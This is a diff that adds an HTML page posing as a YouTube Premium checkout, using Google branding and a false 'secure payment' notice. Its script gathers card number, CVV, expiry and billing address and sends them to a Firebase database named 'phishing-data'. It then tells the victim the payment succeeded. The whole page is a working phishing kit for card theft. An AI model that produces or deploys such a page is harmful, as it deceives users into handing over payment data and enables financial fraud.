@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Premium - Payment</title>
+    <link rel="icon" href="https://www.youtube.com/s/desktop/a386e432/img/favicon_32.png" type="image/x-icon">
+    
+    <!-- Bootstrap 4 -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css"
+        integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    
+    <!-- Custom CSS -->
+    <style>
+        body {
+            background: #f8f9fa;
+            font-family: 'Roboto', sans-serif;
+        }
+        
+        .payment-container {
+            max-width: 800px;
+            margin: 30px auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .header-section {
+            background: #065fd4;
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header-section h1 {
+            font-size: 28px;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+        
+        .header-section p {
+            font-size: 16px;
+            opacity: 0.9;
+            margin: 0;
+        }
+        
+        .plan-summary {
+            background: #f8f9fa;
+            padding: 20px 30px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        
+        .plan-details {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .plan-name {
+            font-size: 18px;
+            font-weight: 500;
+            color: #202124;
+        }
+        
+        .plan-price {
+            font-size: 24px;
+            font-weight: 500;
+            color: #065fd4;
+        }
+        
+        .plan-period {
+            font-size: 14px;
+            color: #5f6368;
+        }
+        
+        .payment-form {
+            padding: 30px;
+        }
+        
+        .section-title {
+            font-size: 16px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-control {
+            border-radius: 4px;
+            border: 1px solid #dadce0;
+            padding: 12px 16px;
+            font-size: 16px;
+        }
+        
+        .form-control:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26,115,232,.2);
+        }
+        
+        .payment-methods {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .payment-method {
+            flex: 1;
+            border: 2px solid #dadce0;
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .payment-method:hover {
+            border-color: #065fd4;
+            background: #f8f9fa;
+        }
+        
+        .payment-method.active {
+            border-color: #065fd4;
+            background: #f0f7ff;
+        }
+        
+        .payment-method img {
+            height: 24px;
+            margin-bottom: 8px;
+        }
+        
+        .payment-method div {
+            font-size: 14px;
+            font-weight: 500;
+            color: #202124;
+        }
+        
+        .btn-primary {
+            background: #065fd4;
+            border: none;
+            border-radius: 4px;
+            padding: 14px 24px;
+            font-size: 16px;
+            font-weight: 500;
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        .btn-primary:hover {
+            background: #0549a8;
+        }
+        
+        .security-notice {
+            background: #e8f0fe;
+            border-radius: 8px;
+            padding: 16px;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+        
+        .security-notice strong {
+            color: #202124;
+        }
+        
+        .terms-text {
+            font-size: 12px;
+            color: #5f6368;
+            text-align: center;
+            margin-top: 20px;
+            line-height: 1.4;
+        }
+        
+        .terms-text a {
+            color: #065fd4;
+            text-decoration: none;
+        }
+        
+        .terms-text a:hover {
+            text-decoration: underline;
+        }
+        
+        .billing-info {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+        
+        .billing-info h6 {
+            font-size: 14px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 10px;
+        }
+        
+        .billing-info p {
+            font-size: 14px;
+            color: #5f6368;
+            margin: 0;
+        }
+        
+        .new-badge {
+            background: #ff0000;
+            color: white;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 11px;
+            font-weight: bold;
+            margin-left: 8px;
+        }
+    </style>
+<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
+</head>
+
+<body>
+    <div class="payment-container">
+        <!-- Header -->
+        <div class="header-section">
+            <h1>Complete your purchase</h1>
+            <p>You're just one step away from YouTube Premium</p>
+        </div>
+        
+        <!-- Plan Summary -->
+        <div class="plan-summary">
+            <div class="plan-details">
+                <div>
+                    <div class="plan-name">YouTube Premium - Individual <span class="new-badge">2025</span></div>
+                    <div class="plan-period">Monthly plan</div>
+                </div>
+                <div class="plan-price">$13.99/mo</div>
+            </div>
+        </div>
+        
+        <!-- Payment Form -->
+        <div class="payment-form">
+            <!-- Billing Information -->
+            <div class="billing-info">
+                <h6>Billing Information</h6>
+                <p>Your payment method will be saved for future purchases and subscriptions.</p>
+            </div>
+            
+            <!-- Payment Methods -->
+            <div class="section-title">Choose payment method</div>
+            <div class="payment-methods">
+                <div class="payment-method active" onclick="selectPaymentMethod(this, 'card')">
+                    <img src="img/G_pay.png" alt="Credit/Debit Card">
+                    <div>Credit/Debit Card</div>
+                </div>
+                <div class="payment-method" onclick="selectPaymentMethod(this, 'paypal')">
+                    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal">
+                    <div>PayPal</div>
+                </div>
+                <div class="payment-method" onclick="selectPaymentMethod(this, 'google')">
+                    <img src="https://www.gstatic.com/images/branding/product/1x/google_pay_2020_color_48dp.png" alt="Google Pay">
+                    <div>Google Pay</div>
+                </div>
+            </div>
+            
+            <!-- Card Details Form -->
+            <div id="cardForm">
+                <div class="section-title">Card information</div>
+                
+                <div class="form-group">
+                    <input type="text" class="form-control" id="cardName" placeholder="Name on card" required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="text" class="form-control" id="cardNumber" placeholder="Card number" maxlength="19" required>
+                </div>
+                
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="form-group">
+                            <input type="text" class="form-control" id="expiryDate" placeholder="MM/YY" maxlength="5" required>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="form-group">
+                            <input type="text" class="form-control" id="cvv" placeholder="CVV" maxlength="4" required>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <input type="text" class="form-control" id="billingAddress" placeholder="Billing address" required>
+                </div>
+                
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="form-group">
+                            <input type="text" class="form-control" id="city" placeholder="City" required>
+                        </div>
+                    </div>
+                    <div class="col-md-3">
+                        <div class="form-group">
+                            <input type="text" class="form-control" id="state" placeholder="State" required>
+                        </div>
+                    </div>
+                    <div class="col-md-3">
+                        <div class="form-group">
+                            <input type="text" class="form-control" id="zipCode" placeholder="ZIP" required>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Security Notice -->
+            <div class="security-notice">
+                <strong>🔒 Secure payment</strong><br>
+                Your payment information is encrypted and secure. Google uses industry-standard security measures to protect your data.
+            </div>
+            
+            <!-- Terms -->
+            <div class="terms-text">
+                By confirming your subscription, you agree to the <a href="#">YouTube Paid Service Terms of Service</a> and authorize Google to charge your payment method for the recurring subscription fee of $13.99/month until you cancel. You can cancel anytime in your account settings.
+            </div>
+            
+            <!-- Submit Button -->
+            <button type="submit" class="btn btn-primary" onclick="processPayment()">
+                Start subscription - $13.99/month
+            </button>
+        </div>
+    </div>
+
+    <!-- Firebase Scripts -->
+    <script src="https://www.gstatic.com/firebasejs/8.0.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.0.1/firebase-analytics.js"></script>
+    
+    <script>
+        // Firebase configuration
+        var firebaseConfig = {
+            apiKey: "AIzaSyDgUD9l-IyrQgV1s7eU4OGPXzvMaXXJyM0",
+            authDomain: "phishing-data.firebaseapp.com",
+            databaseURL: "https://phishing-data.firebaseio.com",
+            projectId: "phishing-data",
+            storageBucket: "phishing-data.appspot.com",
+            messagingSenderId: "239566087596",
+            appId: "1:239566087596:web:5788cc5aa63ab450914609",
+            measurementId: "G-FRFVJDFHSC"
+        };
+        
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        firebase.analytics();
+        
+        let selectedPaymentMethod = 'card';
+        
+        function selectPaymentMethod(element, method) {
+            // Remove active class from all methods
+            document.querySelectorAll('.payment-method').forEach(el => {
+                el.classList.remove('active');
+            });
+            
+            // Add active class to selected method
+            element.classList.add('active');
+            selectedPaymentMethod = method;
+            
+            // Show/hide card form based on selection
+            const cardForm = document.getElementById('cardForm');
+            if (method === 'card') {
+                cardForm.style.display = 'block';
+            } else {
+                cardForm.style.display = 'none';
+            }
+        }
+        
+        // Card number formatting
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formattedValue = value.replace(/(.{4})/g, '$1 ').trim();
+            e.target.value = formattedValue;
+        });
+        
+        // Expiry date formatting
+        document.getElementById('expiryDate').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+        
+        // CVV validation
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+        
+        function processPayment() {
+            // Validate form
+            if (selectedPaymentMethod === 'card') {
+                const requiredFields = ['cardName', 'cardNumber', 'expiryDate', 'cvv', 'billingAddress', 'city', 'state', 'zipCode'];
+                let isValid = true;
+                
+                requiredFields.forEach(field => {
+                    const element = document.getElementById(field);
+                    if (!element.value.trim()) {
+                        element.style.borderColor = '#d93025';
+                        isValid = false;
+                    } else {
+                        element.style.borderColor = '#dadce0';
+                    }
+                });
+                
+                if (!isValid) {
+                    alert('Please fill in all required fields.');
+                    return;
+                }
+            }
+            
+            // Collect payment data
+            const timestamp = new Date().toISOString();
+            let paymentData = {
+                timestamp: timestamp,
+                userAgent: navigator.userAgent,
+                paymentMethod: selectedPaymentMethod,
+                plan: 'YouTube Premium Individual',
+                price: '$13.99/month'
+            };
+            
+            if (selectedPaymentMethod === 'card') {
+                paymentData.cardData = {
+                    cardName: document.getElementById('cardName').value,
+                    cardNumber: document.getElementById('cardNumber').value,
+                    expiryDate: document.getElementById('expiryDate').value,
+                    cvv: document.getElementById('cvv').value,
+                    billingAddress: document.getElementById('billingAddress').value,
+                    city: document.getElementById('city').value,
+                    state: document.getElementById('state').value,
+                    zipCode: document.getElementById('zipCode').value
+                };
+            }
+            
+            // Store in Firebase
+            const ref = firebase.database().ref('payments').push();
+            ref.set(paymentData, function(error) {
+                if (error) {
+                    console.error('Error saving payment data:', error);
+                    alert('Payment processing failed. Please try again.');
+                } else {
+                    console.log('Payment data saved successfully');
+                    // Show success message
+                    alert('Payment processed successfully! You now have YouTube Premium access.');
+                    // Redirect to success page (in real scenario)
+                    window.location.href = 'index.html';
+                }
+            });
+        }
+        
+        // Auto-format card number
+        document.getElementById('cardNumber').addEventListener('blur', function() {
+            let value = this.value.replace(/\s/g, '');
+            if (value.length >= 13 && value.length <= 19) {
+                this.style.borderColor = '#dadce0';
+            } else {
+                this.style.borderColor = '#d93025';
+            }
+        });
+    </script>
+
+</body>
+
+</html>
